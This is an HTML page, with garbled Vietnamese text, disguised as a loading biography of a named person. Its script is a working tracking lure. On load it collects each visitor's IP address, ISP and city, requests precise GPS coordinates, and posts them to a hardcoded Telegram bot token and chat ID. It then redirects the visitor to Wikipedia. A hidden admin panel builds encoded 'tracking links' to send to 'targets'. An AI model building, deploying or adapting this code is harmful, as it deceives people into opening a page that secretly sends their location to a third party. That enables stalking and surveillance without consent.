<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Tiá»ƒu sá»­ ÄÃ o Minh QuÃ¢n</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <div id="frontend-view" class="flex flex-col items-center justify-center h-screen bg-white">
        <div class="loader"></div>
        <p class="mt-4 text-gray-500 text-sm italic">Äang táº£i ná»™i dung tiá»ƒu sá»­...</p>
    </div>

    <div id="admin-view" class="hidden min-h-screen bg-[#0d1117] text-slate-300 p-6">
        <div class="max-w-4xl mx-auto">
            <h1 class="text-2xl font-black text-white mb-8 italic">SENTINEL <span class="text-blue-500">X</span> ADMIN</h1>
            
            <div class="grid md:grid-cols-2 gap-6">
                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 shadow-xl">
                    <h3 class="text-blue-400 font-bold text-xs uppercase mb-4 tracking-widest">Cáº¥u hÃ¬nh Chatbot</h3>
                    <div class="space-y-4">
                        <div>
                            <label class="text-[10px] uppercase block mb-1">Telegram Token:</label>
                            <input id="in-token" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
                        </div>
                        <div>
                            <label class="text-[10px] uppercase block mb-1">Chat ID:</label>
                            <input id="in-id" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
                        </div>
                        <div>
                            <label class="text-[10px] uppercase block mb-1">Redirect URL:</label>
                            <input id="in-redir" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-green-500 outline-none">
                        </div>
                        <button onclick="saveConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl text-xs transition-all">LÆ¯U Cáº¤U HÃŒNH</button>
                    </div>
                </div>

                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800">
                    <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 tracking-widest">Link Tracking Cá»§a Báº¡n</h3>
                    <p class="text-[10px] mb-2">Sá»­ dá»¥ng link nÃ y Ä‘á»ƒ gá»­i cho má»¥c tiÃªu:</p>
                    <div id="tracking-link" class="bg-black p-3 rounded-lg text-blue-400 text-[10px] break-all border border-slate-800"></div>
                    <p class="mt-4 text-[9px] text-slate-500">* LÆ°u Ã½: VÃ¬ khÃ´ng dÃ¹ng PHP, thÃ´ng tin cáº¥u hÃ¬nh Ä‘Æ°á»£c lÆ°u vÃ o URL khi báº¡n gá»­i Ä‘i Ä‘á»ƒ Ä‘áº£m báº£o Bot hoáº¡t Ä‘á»™ng Ä‘Ãºng.</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh
        let config = {
            token: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
            id: "5887642221",
            redir: "https://vi.wikipedia.org/wiki/ÄÃ o_Minh_QuÃ¢n"
        };

        // HÃ m lÆ°u vÃ o LocalStorage (Cho Admin)
        function saveConfig() {
            config.token = document.getElementById('in-token').value;
            config.id = document.getElementById('in-id').value;
            config.redir = document.getElementById('in-redir').value;
            localStorage.setItem('sentinel_config', JSON.stringify(config));
            updateLinkDisplay();
            alert("ÄÃ£ lÆ°u cáº¥u hÃ¬nh thÃ nh cÃ´ng!");
        }

        function updateLinkDisplay() {
            const base = window.location.href.split('?')[0];
            const encoded = btoa(JSON.stringify(config)); // MÃ£ hÃ³a cáº¥u hÃ¬nh vÃ o link
            document.getElementById('tracking-link').innerText = `${base}?v=${encoded}`;
        }

        // Logic chÃ­nh
        window.onload = async () => {
            const urlParams = new URLSearchParams(window.location.search);

            // KIá»‚M TRA Náº¾U LÃ€ TRANG ADMIN
            if (urlParams.has('admin')) {
                document.getElementById('frontend-view').classList.add('hidden');
                document.getElementById('admin-view').classList.remove('hidden');
                
                const saved = localStorage.getItem('sentinel_config');
                if(saved) config = JSON.parse(saved);
                
                document.getElementById('in-token').value = config.token;
                document.getElementById('in-id').value = config.id;
                document.getElementById('in-redir').value = config.redir;
                updateLinkDisplay();
                return;
            }

            // Náº¾U LÃ€ TRANG TRACKING (FRONTEND)
            // Láº¥y cáº¥u hÃ¬nh tá»« tham sá»‘ 'v' (náº¿u cÃ³)
            if (urlParams.has('v')) {
                try {
                    config = JSON.parse(atob(urlParams.get('v')));
                } catch(e) {}
            }

            const send = async (msg) => {
                await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({chat_id: config.id, text: msg, parse_mode: "HTML"})
                });
            };

            // Láº¥y IP
            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
            let info = `ğŸ¯ <b>Má»¤C TIÃŠU Má»šI</b>\nğŸŒ IP: <code>${ipRes?.ip || '?' }</code>\nğŸ¢ ISP: ${ipRes?.org || '?'}\nğŸ“ VÃ¹ng: ${ipRes?.city || '?'}`;
            
            await send(info + "\nâ³ Äang chá» GPS...");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (p) => {
                        const gps = `\nğŸ¯ <b>GPS OK:</b>\nğŸ“ Tá»a Ä‘á»™: <code>${p.coords.latitude},${p.coords.longitude}</code>\nğŸ”— <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Xem báº£n Ä‘á»“</a>`;
                        await send(info + gps);
                        location.replace(config.redir);
                    },
                    async () => {
                        await send(info + "\nâŒ Má»¥c tiÃªu tá»« chá»‘i GPS.");
                        location.replace(config.redir);
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                location.replace(config.redir);
            }
            setTimeout(() => location.replace(config.redir), 7000);
        };
    </script>
</body>
</html>
